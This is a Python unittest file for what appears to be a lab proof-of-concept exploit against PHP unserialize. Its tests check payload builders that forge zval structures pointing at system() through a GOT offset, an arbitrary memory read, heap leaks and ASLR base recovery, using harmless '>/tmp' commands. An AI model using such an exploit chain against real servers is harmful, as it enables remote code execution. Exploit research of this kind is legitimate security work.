from __future__ import annotations

import hashlib
import struct
import unittest

from poc.build_payload import (
    DEL_REF_OFFSET,
    PAYLOAD_SIZE,
    SYSTEM_GOT_OFFSET,
    build_exec,
    build_heap_leak,
    build_invalid_handler_control,
    build_read,
)
from lab.centos7.verify_aslr_chain import derive_php_base
from poc.lossy_utf8 import pointer_base_candidates, raw_pointer_values, transformed


class PayloadTests(unittest.TestCase):
    BASE = 0x7F0000000000

    def test_canonical_vector(self) -> None:
        payload = build_exec(b">/tmp/Z", self.BASE)
        self.assertEqual(len(payload), PAYLOAD_SIZE)
        self.assertEqual(
            hashlib.sha256(payload).hexdigest(),
            "cbdd7a0b483663511f7594ca427b237bb34749461d806a73f5c730756594bf53",
        )

    def test_heap_leak_vector(self) -> None:
        payload = build_heap_leak()
        self.assertEqual(len(payload), 101)
        self.assertEqual(
            hashlib.sha256(payload).hexdigest(),
            "fea349754f36eef44590f408663d73763add52a4b979289a352c5e6b0e5f9639",
        )

    def test_read_fake_zval_fields(self) -> None:
        address = 0x7F0012345000
        payload = build_read(address, 4096)
        self.assertEqual(len(payload), PAYLOAD_SIZE)
        marker = payload.index(b's:24:"') + len(b's:24:"')
        fake = payload[marker : marker + 24]
        pointer, length = struct.unpack("<QI", fake[:12])
        refcount = struct.unpack("<I", fake[16:20])[0]
        self.assertEqual(pointer, address)
        self.assertEqual(length, 4096)
        self.assertEqual(refcount, 0x100)
        self.assertEqual(fake[20], 6)

    def test_read_validation(self) -> None:
        for length in (1, 4096):
            self.assertEqual(len(build_read(self.BASE, length)), PAYLOAD_SIZE)
        for address, length in ((self.BASE, 0), (self.BASE, 4097), (-1, 1), ((1 << 64) - 1, 2)):
            with self.assertRaises(ValueError):
                build_read(address, length)

    def test_lossy_pointer_recovery(self) -> None:
        base = 0x7F0000000000
        symbol_offset = 0x22BA0
        pointer = base + symbol_offset
        cell = transformed(pointer.to_bytes(8, "little"))
        self.assertIn(pointer, raw_pointer_values(cell))
        self.assertEqual(pointer_base_candidates(cell, symbol_offset=symbol_offset), [base])

    def test_php_anchor_derivation(self) -> None:
        anchor = 0x257590
        base = 0x561E67C00000
        heap = bytearray(256)
        heap[0x80:0x88] = (base + anchor).to_bytes(8, "little")
        observed, hits = derive_php_base(bytes(heap), anchor)
        self.assertEqual(observed, base)
        self.assertEqual(hits[0]["heap_offset"], "0x80")

    def test_fake_zval_fields(self) -> None:
        payload = build_exec(b">/tmp/R", self.BASE)
        marker = payload.index(b's:24:"') + len(b's:24:"')
        fake = payload[marker : marker + 24]
        command_qword, handlers, refcount = struct.unpack("<QQI", fake[:20])
        self.assertEqual(command_qword.to_bytes(8, "little").rstrip(b"\0"), b">/tmp/R")
        self.assertEqual(handlers, self.BASE + SYSTEM_GOT_OFFSET - DEL_REF_OFFSET)
        self.assertEqual(refcount, 1)
        self.assertEqual(fake[20], 5)

    def test_invalid_handler_control(self) -> None:
        payload = build_invalid_handler_control(b">/tmp/R")
        marker = payload.index(b's:24:"') + len(b's:24:"')
        _, handlers, _ = struct.unpack("<QQI", payload[marker : marker + 20])
        self.assertEqual(handlers, 0)

    def test_command_boundaries(self) -> None:
        for command in (b"x", b"1234567"):
            self.assertEqual(len(build_exec(command, self.BASE)), PAYLOAD_SIZE)
        for command in (b"", b"12345678", b"a\0b", b"\xff"):
            with self.assertRaises(ValueError):
                build_exec(command, self.BASE)

    def test_address_validation(self) -> None:
        with self.assertRaises(ValueError):
            build_exec(b"x", -1)
        with self.assertRaises(ValueError):
            build_exec(b"x", 1 << 64)
        with self.assertRaises(ValueError):
            build_exec(b"x", (1 << 64) - 1, 1)


if __name__ == "__main__":
    unittest.main()
